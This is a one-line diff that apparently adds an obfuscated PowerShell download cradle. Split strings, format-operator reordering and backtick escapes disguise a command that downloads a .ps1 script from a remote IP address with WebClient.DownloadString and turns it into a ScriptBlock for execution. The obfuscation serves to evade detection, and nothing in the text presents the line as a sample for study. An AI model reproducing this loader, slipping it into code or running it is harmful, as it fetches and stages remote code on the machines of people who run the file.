@@ -1,0 +1,1 @@
+﻿sET-iTEM ("vA"+"RiAB"+"le:l"+"bp9k") (  [type]("{3}{1}{2}{0}" -F'loCk','pT','b','scrI')) ;  $test =  ( GEt-ItEm  ("va"+"riab"+"le:L"+"BP9k")  ).VAluE::"CRe`ATe"((&('new-'+'objec'+'t') ('n'+'e'+'t.'+'wEBclIENt'))."doWNLo`AdsTr`i`NG"(("{8}{4}{5}{3}{7}{6}{1}{0}{2}" -f'ome.ps','h','1','.1','tps','://10','rto-fs/cd-','07.67.244/','ht')))
